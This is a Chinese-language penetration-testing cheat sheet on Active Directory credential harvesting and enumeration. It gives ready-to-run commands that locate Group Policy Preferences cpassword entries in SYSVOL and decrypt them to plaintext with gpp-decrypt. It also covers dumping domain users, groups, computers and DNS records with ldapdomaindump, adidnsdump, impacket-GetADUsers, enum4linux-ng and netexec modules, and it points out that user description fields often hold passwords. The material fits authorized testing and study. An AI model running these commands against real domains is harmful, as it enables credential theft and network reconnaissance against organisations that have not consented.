---
os: linux
service: AD
syntax: ldapdomaindump -u <DOMAIN>\<USER> -p <PASS> <DC>
tags:
  - cmd
---

# GPP 密码与 LDAP 信息导出

## 原理
- GPP（组策略首选项）cpassword：在 SYSVOL 的 Groups.xml 等文件里用可逆 AES 加密存储本地账户密码
- LDAP 匿名/认证查询可导出用户、组、计算机、委派等信息
- DNS 记录能暴露内网主机与 AD 结构

## 前提
- 能读 SYSVOL 共享（通常任何域用户可读）
- 有域账号（ldapdomaindump）或匿名 LDAP 可查

## 前置检查

### 找 GPP 密码文件
```bash
# 列出 SYSVOL
smbclient //<DC>/SYSVOL -U <DOMAIN>/<USER>%<PASS>
# 找 Groups.xml
find / -name "Groups.xml" 2>/dev/null
```
用 netexec 自动找：
```bash
nxc smb <DC> -u <USER> -p <PASS> -M gpp_password
nxc smb <DC> -u <USER> -p <PASS> -M gpp_autologin
```

## 利用步骤

### 1. GPP cpassword 解密
```bash
gpp-decrypt <CPASSWORD>
# 例如
gpp-decrypt "PCX/9cT+V7..."
```
- 直接输出明文密码，可用于登录

### 2. ldapdomaindump 导出域信息
```bash
ldapdomaindump -u <DOMAIN>\<USER> -p <PASS> <DC>
# 或指定 LDAPS
ldapdomaindump ldaps://<DC> -u <DOMAIN>\<USER> -p <PASS>
```
- 生成 `domain_users.html/json`、`domain_computers`、`domain_groups`、`domain_policy` 等
- 重点看 domain_users 里的描述字段、域管组成员

### 3. adidnsdump 拉 AD 内网 DNS 记录
```bash
adidnsdump -u <DOMAIN>\<USER> -p <PASS> <DC>
# 或匿名
adidnsdump --print-zones <DC>
```
- 生成 `records.csv`，暴露内网主机名和 IP

### 4. GetADUsers.py 导出用户列表
```bash
impacket-GetADUsers -all <DOMAIN>/<USER>:<PASS> -dc-ip <DC>
```
- 输出用户名 + 描述，描述里常含密码/敏感信息

### 5. enum4linux-ng 综合枚举
```bash
enum4linux-ng -A <DC> -u <USER> -p <PASS>
# 匿名
enum4linux-ng -A <DC>
```
- 拉 SMB 共享、用户、组、密码策略等

## 常见坑
- SYSVOL 里 Groups.xml 路径：`\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml`
- 打了 KB2928120 的系统默认不再新建 cpassword，但老域里常仍有残留
- LDAP 匿名绑定很多域默认关闭，需认证

## 参考开源项目
- impacket (https://github.com/fortra/impacket)
- ldapdomaindump (https://github.com/dirkjanm/ldapdomaindump)
- adidnsdump (https://github.com/dirkjanm/adidnsdump)
- enum4linux-ng (https://github.com/cddmp/enum4linux-ng)
